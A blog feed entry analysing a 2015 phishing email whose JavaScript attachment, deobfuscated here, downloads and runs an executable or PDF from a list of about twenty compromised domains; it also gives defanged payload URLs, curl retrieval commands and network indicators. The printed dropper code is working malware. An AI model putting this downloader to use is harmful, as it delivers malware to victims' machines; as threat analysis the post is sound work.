    <link href="http://elauqsap.github.io/blog/2015/08/11/more-emails-with-malicious-javascript-attachments/"/>
    <updated>2015-08-11T19:44:56-05:00</updated>
    <id>http://elauqsap.github.io/blog/2015/08/11/more-emails-with-malicious-javascript-attachments</id>
    <content type="html"><![CDATA[<p>Slightly late but I ran into another malicious JavaScript attachment that appears to be downloading something besides Ransomware. From automated sandbox analysis it seems to be a Rovnix variant but I am not so sure. I plan to do a little more OSINT and provide an update but here is my analysis for now.</p>

<!--more-->


<h4>Email Indicators</h4>

<pre><code>Received: from 1487.vanager.de (1487.vanager.de [195.225.105.38])
From: "Sofia Gallo" &lt;a.scelerisque.sed@mollisDuissit.edu&gt;
To: REDACTED
Subject: Attention! Reservation change.
Date: Sat, 8 Aug 2015
Attachment: Photo_8739.zip -&gt; IMG_7099.js
</code></pre>

<hr />

<h4>Message Body</h4>

<pre><code>I wanted to change a reservation!
Because some friends canceled, I would like to change reservation to two
double room!

Details of changes in attachment.
Thanks!
</code></pre>

<h3>Deobfuscating the JavaScript</h3>

<p>There are a few subtle differences in this weeks example that make it different from the campaign we saw last week. Besides the actual malware being delivered, this file is not a double dot extension like last week where the file ended as <code>.doc.js</code>. The obfuscation is also slightly different because we didn&rsquo;t have to tweak the original code in order to see the function it builds for evaluation. The deobfuscated function also contains an array of domains that the script attempts to download 1 of 2 payloads (pdf or exe).</p>

<figure class='code'><figcaption><span>IMG_7099.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">// Key to deobfuscate</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="s1">&#39;eKTHj9DZ&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Obfuscated function</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="s1">&#39;\x03&gt;:+\x1eP+4E,;:\x1fMl?L0&quot;)\x18\x190gGz`e\x27x\x17\x15*\x06z\x0b%td\x10)\x02\x1a\x039t\x17t&amp;\x04\x19h)q\x01\x1b5\x19\x1d\x12/j\x09\x09K\x08\x1b\x05J|\x08\x1f(\x0e\x1a\x1c-l\x09\x080\x00z\x0b%tk6\x04%3=\x0b^!z,\x09\x19\x0c+m\x05\x19$\x1bz\x0b%tk-\x15f7\x27\x04M!4\x11d  \x0fT!)J*7)\x0e\x5c)#E\x1c\x11\x04&amp;w\x01\x096\x03\x11\x1a(x\x08t&amp;\x04\x19g\x1dIi9\x0a% -\x04Mk.\x0d.9-\x19\x1603\x0b2y.\x18X)?\x12$&amp;#Jp\x10\x09(\x12\x00\x0d+\x17\x07\x15(d,%\x06K49E&lt;#?Du\x05\x14!\x1f\x1b\x1d8s\x05\x0a$\x05z\x0b%td\x13+\x1f\x11\x0f8p\x10\x036\x06\x07\x06-\x17\x07\x15(k\x17\x1a/x\x10\x133\x0e\x12\x07%}\x17\x0e&lt;\x07\x1d\x1b&gt;\x17\x07\x15(k#?\x1d\x17\x0f\x17!\x0e\x06\x1d$s\x01\x0d \x07\x06\x11Dz\x0b\x17E\x0a\x10\x0d$`\x05\x151\x0e\x18\x0d/mj\x19*\x06t\x05+s\x0b\x08&amp;\x0a\x07\x0dDv\x16\x1dE\x02\x07\x1c+w\x06\x0f)\x00\x18\x01\x27xj\x157\x0ct\x0d$m\x0c\x1f)\x1bz\x0b%td\x12 \x0a\x18\x01$~\x17\x0a7\x02\x1a\x0f=v\x16\x116\x03\x1b\x189\x17\x07\x15(d#8GZ+4\x11.:&lt;EM,?\x08.\x27g\x1eK%,\x00\x27y*\x06V#=\x009t\x1c?~\x16\x1b-\x04\x00\x0d&amp;jj\x19*\x06t?\x1dNj&lt;\x09$&amp;!\x0bW&amp;(\x10.:!\x04^j9\x0a&amp;t\x02?x\x08\x0e*\x1c\x11\x1a&gt;k\x0d\x1b+\x0c\x18\x0dDz\x0b\x17E\x06\x15\x09!z\x05\x08!e\x17\x07\x27\x193-\x12e&gt;)\x01P)8\x0a8 f\x1aUd\x0e-\x0e\x02\x01&amp;u\x05\x1d \x1d\x11\x1c/k\x0d\x14$\x19\x0d\x00%j\x14\x131\x0a\x18f)v\x09xK8$$\x03MlxEi}s\x0fAyxGvi-U\x1bj?\x1d.vrH\x174&gt;\x03io.\x05Kl,\x049t\x05W\x09\x7f\x17Y?z$\x0fW#.\x0dp\x19cA\x10?,\x049t&amp;WW!-E\x0a7&lt;\x03O!\x02*)&gt;-\x09Mlx2\x187:\x03I0t6#1$\x06\x1bmv*v:f/A4;\x0b/\x11&amp;\x1cP65\x0b&amp;1&amp;\x1ej0(\x0c%3;B\x1ba\x0e \x06\x04mH\x10o\x09\x119=&amp;\x0d\x17&quot;(\x0a&amp;\x17 \x0bK\x075\x01.|qX\x10o\x17\x04?&lt;f\x18V14\x01ce-R\x13\x09;\x11#z:\x0bW 5\x08c}aA\x5c&lt;v vdd\x18\x04*?\x12k\x15+\x1eP2?=\x046&quot;\x0fZ0rG\x06\x07\x10\x27uvt=\x06\x18\x00&gt;m\x14xLp&amp;f\x05W6?\x04/-;\x1eX0?\x06#5&amp;\x0d\x5cy&lt;\x10%7&lt;\x03V*rL0=.B\x0dyg\x17e&amp;-\x0b]=\x09\x11* -L\x1fvjUvi:DJ0;\x11&gt;\x27a\x11O%(E.i&amp;\x0fNd\x1b\x06?=&gt;\x0fa\x0b8\x0f.7&lt;B\x1b\x05\x1e*\x0f\x16f9M6?\x04&amp;vaQP&quot;r\x00e;8\x0fWlsI.z&lt;\x13I!gTg1f\x1dK-.\x00c&amp;f8\x5c7*\x0a%\x27-(V #Lga-Y\x05!t\x16&quot;.-CB\x01gTg1f\x1aV73\x11&quot;;&amp;W\x09h?K85&gt;\x0fm+\x1c\x0c\x271`%\x15vs^?&amp;1\x11Wj\x08\x10%|\x07F\x08hjL67)\x1eZ,r\x11b/5\x17\x5cj9\x09$\x27-B\x109\x27^?&amp;1\x11Kj5\x15.:`H~\x01\x0eGgv \x1eM4`Jdvc\x1eb\x09\x07Ni{/\x0fMj*\x0d;k,\x0d_ &lt;\x02vvc\x27X02K95&amp;\x0eV)rL`vn\x01\x5c=gG`?-\x13\x12!vDz}d\x18\x177?\x0b/|a\x17Z%.\x06#|)CB93\x03ceuW|m8\x17.5#\x17D/?\x1cvv._\x1bh=\x0a9!&lt;B\x1bfsI,;:\x1fMlxC;0.WJ!;\x17(&lt;jC\x02&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">_0x12bd</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;\x6C\x65\x6E\x67\x74\x68&quot;</span><span class="p">,</span> <span class="s2">&quot;\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74&quot;</span><span class="p">,</span> <span class="s2">&quot;\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65&quot;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Build the function string to be evaluated</span>
</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">dhhas3uu</span> <span class="o">=</span> <span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">[</span><span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">1</span><span class="p">]];</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">dhhas3uu</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">[</span><span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">3</span><span class="p">]](</span><span class="nx">b</span><span class="p">[</span><span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">i</span><span class="p">)</span> <span class="o">^</span> <span class="nx">key</span><span class="p">[</span><span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">j</span><span class="p">)),</span> <span class="nx">j</span><span class="o">++</span><span class="p">,</span> <span class="nx">j</span> <span class="o">==</span> <span class="nx">key</span><span class="p">[</span><span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Evaluate the deobfuscated JavaScript</span>
</span><span class='line'><span class="nb">eval</span><span class="p">(</span><span class="nx">dhhas3uu</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>deobfuscated.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">gorut</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="s2">&quot;14-MASOOM.COM JLINKSMS.COM CHEAPRIZESMS.COM ELEMENTGUMRUK[.]COM/language IBMDATACAP[.]COM/wp-content/themes/academy WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework ITSMYTEA[.]COM/xmlrpc www.LANDTOURJAPAN[.]COM INTEGRITYSMSNG[.]COM CREATIVEFOODSTYLIST[.]COM www.KMDERUNJEWELRY[.]COM ADENYAOTELEET[.]COM MAJORCASE[.]ORG ISTANBULKLIMA[.]ORG ENTHELP[.]COM HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger TUGRAHOTELS[.]COM www.florianbruening[.]com JUALTOWERTRIANGLE[.]COM MAAKCARD[.]COM www.jakimbost[.]pl THEVILLAGEVETERINARYHOSPITAL[.]COM&quot;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nx">ex</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span> <span class="o">==</span> <span class="nx">e</span> <span class="o">?</span> <span class="s2">&quot;.exe&quot;</span> <span class="o">:</span> <span class="s2">&quot;.pdf&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">M</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">M</span> <span class="o">&lt;</span> <span class="nx">t</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">M</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;WScript.Shell&quot;</span><span class="p">),</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nx">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s2">&quot;%TEMP%&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">round</span><span class="p">(</span><span class="mf">100000000.0</span> <span class="o">*</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">())</span> <span class="o">+</span> <span class="nx">ex</span><span class="p">,</span> <span class="nx">E</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="nx">r</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="mi">4</span> <span class="o">==</span> <span class="nx">r</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">&amp;&amp;</span> <span class="mi">200</span> <span class="o">==</span> <span class="nx">r</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;ADODB.Stream&quot;</span><span class="p">);</span>
</span><span class='line'>              <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">open</span><span class="p">(),</span> <span class="nx">e</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">ResponseBody</span><span class="p">),</span> <span class="mf">5000.0</span> <span class="o">&lt;</span> <span class="nx">e</span><span class="p">.</span><span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                  <span class="nx">E</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">position</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">saveToFile</span><span class="p">(</span><span class="nx">O</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>                  <span class="k">try</span> <span class="p">{</span>
</span><span class='line'>                      <span class="nx">n</span><span class="p">.</span><span class="nx">Run</span><span class="p">(</span><span class="nx">O</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>                  <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>                  <span class="p">}</span>
</span><span class='line'>              <span class="p">}</span>
</span><span class='line'>              <span class="nx">e</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>      <span class="p">};</span>
</span><span class='line'>      <span class="k">try</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">r</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;hxxp://&quot;</span> <span class="o">+</span> <span class="nx">t</span><span class="p">[</span><span class="nx">M</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;/get.php?dgfdfg=&quot;</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&quot;&amp;key=&quot;</span> <span class="o">+</span> <span class="nx">key</span> <span class="o">+</span> <span class="nx">e</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">),</span> <span class="nx">r</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">E</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">key</span> <span class="o">=</span> <span class="s2">&quot;f5&quot;</span><span class="p">,</span> <span class="nx">gorut</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">),</span> <span class="nx">gorut</span><span class="p">(</span><span class="s2">&quot;&amp;pdf=search&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Removing a few lines in <code>gorut()</code> routine of the download script allows to print out download links for the two payloads it attempts to get. Basically you need to remove the ActiveX code and modify <code>r.open</code> to <code>console.log</code> function removing the <code>!1</code> parameter. Running this in node.js will give us a list of payload downloads for the second stage.</p>

<figure class='code'><figcaption><span>modified_function.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">gorut</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="s2">&quot;14-MASOOM.COM JLINKSMS.COM CHEAPRIZESMS.COM ELEMENTGUMRUK[.]COM/language IBMDATACAP[.]COM/wp-content/themes/academy WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework ITSMYTEA[.]COM/xmlrpc www.LANDTOURJAPAN[.]COM INTEGRITYSMSNG[.]COM CREATIVEFOODSTYLIST[.]COM www.KMDERUNJEWELRY[.]COM ADENYAOTELEET[.]COM MAJORCASE[.]ORG ISTANBULKLIMA[.]ORG ENTHELP[.]COM HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger TUGRAHOTELS[.]COM www.florianbruening[.]com JUALTOWERTRIANGLE[.]COM MAAKCARD[.]COM www.jakimbost[.]pl THEVILLAGEVETERINARYHOSPITAL[.]COM&quot;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nx">ex</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span> <span class="o">==</span> <span class="nx">e</span> <span class="o">?</span> <span class="s2">&quot;.exe&quot;</span> <span class="o">:</span> <span class="s2">&quot;.pdf&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">M</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">M</span> <span class="o">&lt;</span> <span class="nx">t</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">M</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;hxxp://&quot;</span> <span class="o">+</span> <span class="nx">t</span><span class="p">[</span><span class="nx">M</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;/get.php?dgfdfg=&quot;</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&quot;&amp;key=&quot;</span> <span class="o">+</span> <span class="nx">key</span> <span class="o">+</span> <span class="nx">e</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Payload Links</h4>

<pre><code>GET hxxp://14-MASOOM[.]COM/get.php?dgfdfg=0.2042055584024638&amp;key=f5
GET hxxp://JLINKSMS[.]COM/get.php?dgfdfg=0.4357860581949353&amp;key=f5
GET hxxp://CHEAPRIZESMS[.]COM/get.php?dgfdfg=0.9873443075921386&amp;key=f5
GET hxxp://ELEMENTGUMRUK[.]COM/language/get.php?dgfdfg=0.697707447456196&amp;key=f5
GET hxxp://IBMDATACAP[.]COM/wp-content/themes/academy/get.php?dgfdfg=0.21713185170665383&amp;key=f5
GET hxxp://WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework/get.php?dgfdfg=0.5791356258559972&amp;key=f5
GET hxxp://ITSMYTEA[.]COM/xmlrpc/get.php?dgfdfg=0.5410346924327314&amp;key=f5
GET hxxp://www.LANDTOURJAPAN[.]COM/get.php?dgfdfg=0.418818884762004&amp;key=f5
GET hxxp://INTEGRITYSMSNG[.]COM/get.php?dgfdfg=0.029143808409571648&amp;key=f5
GET hxxp://CREATIVEFOODSTYLIST[.]COM/get.php?dgfdfg=0.3915193013381213&amp;key=f5
GET hxxp://www.KMDERUNJEWELRY[.]COM/get.php?dgfdfg=0.07052874471992254&amp;key=f5
GET hxxp://ADENYAOTELEET[.]COM/get.php?dgfdfg=0.8330098567530513&amp;key=f5
GET hxxp://MAJORCASE[.]ORG/get.php?dgfdfg=0.5714250793680549&amp;key=f5
GET hxxp://ISTANBULKLIMA[.]ORG/get.php?dgfdfg=0.6278960527852178&amp;key=f5
GET hxxp://ENTHELP[.]COM/get.php?dgfdfg=0.48202996351756155&amp;key=f5
GET hxxp://HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger/get.php?dgfdfg=0.2205682178027928&amp;key=f5
GET hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5
GET hxxp://www.florianbruening[.]com/get.php?dgfdfg=0.0033856993541121483&amp;key=f5
GET hxxp://JUALTOWERTRIANGLE[.]COM/get.php?dgfdfg=0.7687414824031293&amp;key=f5
GET hxxp://MAAKCARD[.]COM/get.php?dgfdfg=0.14662570762448013&amp;key=f5
GET hxxp://www.jakimbost[.]pl/get.php?dgfdfg=0.4327525827102363&amp;key=f5
GET hxxp://THEVILLAGEVETERINARYHOSPITAL[.]COM/get.php?dgfdfg=0.48534721904434264&amp;key=f5
GET hxxp://14-MASOOM[.]COM/get.php?dgfdfg=0.6709314966574311&amp;key=f5&amp;pdf=search
GET hxxp://JLINKSMS[.]COM/get.php?dgfdfg=0.020113263744860888&amp;key=f5&amp;pdf=search
GET hxxp://CHEAPRIZESMS[.]COM/get.php?dgfdfg=0.6769137345254421&amp;key=f5&amp;pdf=search
GET hxxp://ELEMENTGUMRUK[.]COM/language/get.php?dgfdfg=0.1893466750625521&amp;key=f5&amp;pdf=search
GET hxxp://IBMDATACAP[.]COM/wp-content/themes/academy/get.php?dgfdfg=0.11392477317713201&amp;key=f5&amp;pdf=search
GET hxxp://WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework/get.php?dgfdfg=0.7516817327123135&amp;key=f5&amp;pdf=search
GET hxxp://ITSMYTEA[.]COM/xmlrpc/get.php?dgfdfg=0.45238890522159636&amp;key=f5&amp;pdf=search
GET hxxp://www.LANDTOURJAPAN[.]COM/get.php?dgfdfg=0.5003419334534556&amp;key=f5&amp;pdf=search
GET hxxp://INTEGRITYSMSNG[.]COM/get.php?dgfdfg=0.7602681068237871&amp;key=f5&amp;pdf=search
GET hxxp://CREATIVEFOODSTYLIST[.]COM/get.php?dgfdfg=0.2591306504327804&amp;key=f5&amp;pdf=search
GET hxxp://www.KMDERUNJEWELRY[.]COM/get.php?dgfdfg=0.19865264417603612&amp;key=f5&amp;pdf=search
GET hxxp://ADENYAOTELEET[.]COM/get.php?dgfdfg=0.8011750828009099&amp;key=f5&amp;pdf=search
GET hxxp://MAJORCASE[.]ORG/get.php?dgfdfg=0.7017634396906942&amp;key=f5&amp;pdf=search
GET hxxp://ISTANBULKLIMA[.]ORG/get.php?dgfdfg=0.33236109651625156&amp;key=f5&amp;pdf=search
GET hxxp://ENTHELP[.]COM/get.php?dgfdfg=0.25800628517754376&amp;key=f5&amp;pdf=search
GET hxxp://HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger/get.php?dgfdfg=0.4463676530867815&amp;key=f5&amp;pdf=search
GET hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5060989174526185&amp;key=f5&amp;pdf=search
GET hxxp://www.florianbruening[.]com/get.php?dgfdfg=0.8751774763222784&amp;key=f5&amp;pdf=search
GET hxxp://JUALTOWERTRIANGLE[.]COM/get.php?dgfdfg=0.08316186326555908&amp;key=f5&amp;pdf=search
GET hxxp://MAAKCARD[.]COM/get.php?dgfdfg=0.8340241997502744&amp;key=f5&amp;pdf=search
GET hxxp://www.jakimbost[.]pl/get.php?dgfdfg=0.9773174184374511&amp;key=f5&amp;pdf=search
GET hxxp://THEVILLAGEVETERINARYHOSPITAL[.]COM/get.php?dgfdfg=0.6214603304397315&amp;key=f5&amp;pdf=search
</code></pre>

<p>So now that we have the payload URLs we can download them for further analysis. It attempts to download either a malicious executable or pdf. The URLs without <code>&amp;pdf=search</code> on the end are the MS-DOS executables. When attempting to download these I noticed that my curl command was failing with my Firefox user agent (404 page). Switching it to a traditional IE10 user agent allowed me to download the payload.</p>

<h4>Failed Command</h4>

<pre><code>curl -vA "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0" -L "hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5" &gt; bad_dl.exe

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                               Dload  Upload   Total   Spent    Left  Speed
0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 159.253.42.153...
Connected to TUGRAHOTELS[.]COM (159.253.42.153) port 80 (#0)

GET /get.php?dgfdfg=0.5332026502583176&amp;key=f5 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Host: TUGRAHOTELS[.]COM
Accept: */*

HTTP/1.1 200 OK
Content-Type: application/x-msdownload
Content-Disposition: inline; filename=Adobe_update-YXXQ1RX4IL6LV2M.exe
Content-Length: 3
Date: Tue, 11 Aug 2015 21:01:02 GMT
Accept-Ranges: bytes
Server LiteSpeed is not blacklisted
Server: LiteSpeed
Connection: close

{ [data not shown]
100     3  100     3    0     0      2      0  0:00:01  0:00:01 --:--:--     2
Closing connection 0
</code></pre>

<hr />

<h4>Successful Command</h4>

<pre><code>curl -vA "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" -L "hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5" &gt; bad

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                               Dload  Upload   Total   Spent    Left  Speed
0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 159.253.42.153...
Connected to TUGRAHOTELS.COM (159.253.42.153) port 80 (#0)
GET /get.php?dgfdfg=0.5332026502583176&amp;key=f5 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
Host: TUGRAHOTELS[.]COM
Accept: */*

HTTP/1.1 200 OK
Content-Type: application/x-msdownload
Content-Disposition: inline; filename=Adobe_update-ZLFNDKIGUO7.exe
Date: Tue, 11 Aug 2015 21:03:35 GMT
Accept-Ranges: bytes
Server LiteSpeed is not blacklisted
Server: LiteSpeed
Connection: close

{ [data not shown]
100  214k    0  214k    0     0  89872      0 --:--:--  0:00:02 --:--:-- 89872
Closing connection 0
</code></pre>

<p>Unfortunately, I was only able to get the network indicators below from the executable and none from the pdf file. I am working on beefing up my sandboxing environment to better handle situations like this but until then I will have to leave this post as is for now. Hopefully I can provide an update on the malware family as well as any further OSINT I find. Please feel free to contact me about the analysis or any questions you have.</p>

<h4>Adobe_update-YXXQ1RX4IL6LV2M.exe Analysis</h4>

<pre><code>GET hxxp://109.120.142.168:80/ac33/b/btc.exe
GET hxxp://109.120.142.168:80/ac33/p/pc.exe
GET hxxp://109.120.142.168:80/ac33/g/gc.exe
GET hxxp://109.120.142.168:80/ac33/bk/bkc.exe
POST hxxp://109.120.180.29:80/intro/data.php
Server IP: 109.120.180.29

GET hxxp://constitution.org:80/usdeclar.txt
Server IP: 54.175.58.135
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ransomware From Emails With JavaScript Attachments]]></title>
    <link href="http://elauqsap.github.io/blog/2015/08/05/ransomware-from-emails-with-javascript-attachments/"/>
    <updated>2015-08-05T19:12:35-05:00</updated>
    <id>http://elauqsap.github.io/blog/2015/08/05/ransomware-from-emails-with-javascript-attachments</id>
